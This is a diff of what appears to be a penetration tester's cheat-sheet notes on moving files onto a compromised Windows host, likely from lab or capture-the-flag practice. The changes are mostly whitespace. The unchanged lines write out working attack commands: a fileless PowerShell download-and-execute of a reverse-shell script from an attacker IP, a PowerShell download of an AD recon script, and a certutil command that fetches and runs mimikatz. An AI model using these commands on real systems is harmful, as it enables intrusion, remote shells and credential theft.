@@ -1,7 +1,7 @@
 
 UPLOAD
 
-      1) Powershell ==> 
+       1) Powershell ==> 
              a) way 1 : Download & Execute , Without Writing on Disk ==>
  
                     powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
@@ -15,16 +15,15 @@ UPLOAD
                         ==> from CMD       
                                   powershell -c (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')        * working  
 
-       2) certutil  ==> 
+        2) certutil  ==> 
 
                   certutil.exe -urlcache -split -f http://10.11.1.198:8080/mimikatz.exe mimikatz.exe & mimikatz.exe
-
 
         3) list allowed http methods ==>
 
                    curl -v -X OPTIONS http://192.168.1.109
 
-
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 DOWNLOAD
 
